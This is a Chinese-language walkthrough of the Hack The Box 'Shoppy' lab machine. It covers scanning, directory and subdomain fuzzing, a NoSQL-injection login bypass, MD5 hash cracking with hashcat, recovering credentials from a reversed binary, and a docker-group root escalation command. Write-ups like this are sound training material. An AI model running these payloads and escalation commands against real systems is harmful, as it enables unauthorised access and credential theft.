# 开始


![在这里插入图片描述](https://img-blog.csdnimg.cn/8de6802c484740acb3bcb4c8e91e4c1b.png)

网址：
```
https://app.hackthebox.com/machines/Shoppy
```
# 信息搜集
使用nmap扫描ip
```
nmap -sC -sV -p- 10.10.11.180
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b88e6b911e17464cbb27402d956afd71.png)


根据扫描结果，发现了一个域名，我们需要本地dns解析这个域名
```
echo "10.10.11.180 shoppy.htb" >> /etc/hosts
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/db0dff40bd914b30afb7b2a1e5d377ea.png)
# 网站信息收集
我们需要安装一个字典
```
apt install seclists
```

然后枚举网站的目录
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100 -mc 200,302,301 -u http://shoppy.htb/FUZZ
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/42eb37d0b0e94aa0b4b4fc70483b812f.png)

发现了后台什么的，我们去浏览器页面看看


![在这里插入图片描述](https://img-blog.csdnimg.cn/ea9739c346144ea7b4c755829a63861a.png)

我尝试了一下万能密码，没想到成功了
```
admin'||'1==1
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e1eed2c63e594e55a39051a6307f97a0.png)

登录后台后，右上角有一个搜索用户的图标，我们继续输入万能密码试试

![在这里插入图片描述](https://img-blog.csdnimg.cn/6319fe01590443d39c67205d4c015061.png)


按下回车后有一个下载的图标

![在这里插入图片描述](https://img-blog.csdnimg.cn/2369c24750fc4621ac6528579b23741c.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/3ffe9a59a4904b33816aad2a175f760e.png)



这里找到了两个账户密码的hash值，然后我用hashcat爆破，发现admin爆不出来，而josh用户的可以
```
echo "6ebcea65320589ca4f2f1ce039975995" > hash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/2765c1e542fb49448761c3a423f242c1.png)

我之前爆破过，这里就直接出现密码了，我用这个用户名和密码登录ssh，发现不对，可能还有哪里的信息搜集没做完，这里的用户名和密码可能是另一个网站的，我们可以枚举一下网站的子域名
```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/481697b7834e4e6284e5b765503cc39a.png)

这里找到一个子域名，我们将他也解析一下
```
echo "10.10.11.180 mattermost.shoppy.htb" >> /etc/hosts
```



![在这里插入图片描述](https://img-blog.csdnimg.cn/3d24615fcd07472aaa54be1133a71d54.png)

然后去浏览器里看看



![在这里插入图片描述](https://img-blog.csdnimg.cn/30610b1e3a5e4b28b5aa269c6cd4c99c.png)

发现了一个登录的页面，我们输入之前爆破的用户名和密码试试


![在这里插入图片描述](https://img-blog.csdnimg.cn/500a365fe3c54681ab8c102ddefe7ca4.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/baa39d11d6ec4e97a3c8b157908bb741.png)

# 获取用户权限
成功登录，在这里可以发现ssh的账号和密码，我们ssh登录试试
```
ssh jaeger@10.10.11.180
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/e53fece169cd44e7953f43a4b5111f4b.png)


# 获取root权限

## 文件静态分析
```
sudo -l
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/f588e1199e5140ebb037fb03f71e3f14.png)

我检查了一下当前用户可以使用sudo命令执行什么，发现了一个奇怪的文件，我们将这个文件下载到kali里
注意，这里需要移动到文件的目录里
```
python3 -m http.server 1234
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5cb9312152534f4b9c998087aa8d17b8.png)

然后用kali下载这个文件
```
wget http://10.10.11.180:1234/password-manager
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/6d06f8df2f3c4307b9895b05d86ee87e.png)

获取文件信息
```
file password-manager
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/751a959cfc1a422cbd7f3954199fffa0.png)

这是一个64位的可执行文件，然后用radare2静态分析这个程序
```
r2 password-manager
```
然后输入指令，定位到主函数地址
```
aaa  //自动分析并命名函数
afl  //查看程序内的函数
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8f3ecc4dd08445cbb7c369ae81067e57.png)


这里找到了main函数，然后去到main函数的地址并查看汇编代码
```
s main  //定位到main函数地址
pdf  //查看当前函数的汇编代码
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/d98582bd3e5e496996289b7699481675.png)

这是一个c++写的程序，运行程序的之后会输出Welcome to Josh password manager!字符串

![在这里插入图片描述](https://img-blog.csdnimg.cn/b24a7cb59810477eb1f0e10224691f3a.png)

然后输出Please enter your master password:字符串，并接受我们的输入

![在这里插入图片描述](https://img-blog.csdnimg.cn/f0a68521173a4af7a9104691c82f1a7c.png)

在下面，程序会和我们输入的字符和Sample字符一个一个的做对比

![在这里插入图片描述](https://img-blog.csdnimg.cn/b2d6f3f9527f4934af147233f3016bab.png)


我们输入的字符串是Sample后，会输出Access granted! Here is creds !字符串，表示我们输入正确，然后会执行一个系统命令，查看/home/deploy/creds.txt文件内容

用ida查看文件，也和我们分析的一样

![在这里插入图片描述](https://img-blog.csdnimg.cn/dd96b96fa55f4b628414b20af21d7449.png)


回到靶机，运行程序，输入Sample
```
sudo -u deploy ./password-manager
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/f983895f3e9046bbbdbee5145c1187dd.png)
## docker越权提权

我们获得了deploy用户的账号和密码，然后切换账号
```
su deploy
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/4c92724e60c34c76b4a12c2f6b8cfbb7.png)

在输入id的时候，发现了这个用户在docker组里

![在这里插入图片描述](https://img-blog.csdnimg.cn/358c54c2204744a185ff6e473a187a01.png)

去到这个网站，ctrl+f搜索docker
```
https://gtfobins.github.io/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/99e97ccb0193473d8f41e76bfb32483d.png)


![在这里插入图片描述](https://img-blog.csdnimg.cn/a241af686535441d9d0274be58dff494.png)

输入此命令，即可获得root shell
```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![**加粗样式**](https://img-blog.csdnimg.cn/420f5a17142147e8ad5bba58f27ee535.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/ed33b24155e043bf9df00387aeb9f786.png)

